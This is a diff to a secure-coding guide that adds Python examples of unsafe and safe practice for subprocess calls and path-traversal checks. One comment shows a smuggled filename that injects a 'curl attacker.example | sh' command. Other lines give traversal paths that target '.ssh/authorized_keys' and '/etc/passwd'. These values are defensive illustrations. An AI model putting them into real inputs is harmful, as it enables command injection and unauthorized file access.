@@ -21,14 +21,39 @@ description: >-
 - **Dependencies are scanned for known vulnerabilities**, and a finding blocks the upgrade path it
   came in on.
 - **SQL is always parameterized** — including order-by clauses and table names, which are chosen
-  from a whitelist of constants, never interpolated. `LiteralString` makes this a type error.
+  from a whitelist of constants, never interpolated. Annotating the query parameter
+  `LiteralString` lets pyright reject an interpolated query; mypy treats it as plain `str` and
+  does not, so under mypy this rule rests on review.
 - **Subprocesses take an argument list, never a shell string.** Executable paths and arguments are
   validated, not concatenated from input.
+
+```python
+# WRONG — a filename such as "x; curl attacker.example | sh" is a second command
+subprocess.run(f"gzip --keep {filename}", shell=True, check=True, timeout=_GZIP_TIMEOUT_SECONDS)
+
+# CORRECT — one argument per item, and "--" stops a name such as "-r" being read as an option
+subprocess.run(["gzip", "--keep", "--", filename], check=True, timeout=_GZIP_TIMEOUT_SECONDS)
+```
+
 - **Parse untrusted formats defensively**: safe loaders only, hardened XML, and no evaluation of
   untrusted input.
 - **Path traversal**: any path derived from external input is resolved and checked to be contained
   within its base. Filenames from users are data — a sanitized display name plus a generated
-  storage name, never used raw.
+  storage name, never used raw. The archive-extraction variant is the classic one: an entry named
+  `../../.ssh/authorized_keys` writes wherever it points.
+
+```python
+# WRONG — "../../etc/passwd" still starts with the root string, and so does "/srv/uploads-old"
+path = upload_root / filename
+if not str(path).startswith(str(upload_root)):
+    raise UnsafePathError(filename)
+
+# CORRECT — resolve ".." and symlinks first, then compare path components, not characters
+path = (upload_root / filename).resolve()
+if not path.is_relative_to(upload_root.resolve()):
+    raise UnsafePathError(filename)
+```
+
 - **Server-side request forgery**: URLs from users are validated against an allowlist of schemes
   and hosts before fetching; redirects are re-validated, because the allowlist you checked before
   the request is worthless otherwise; internal metadata ranges and loopback are blocked by default.
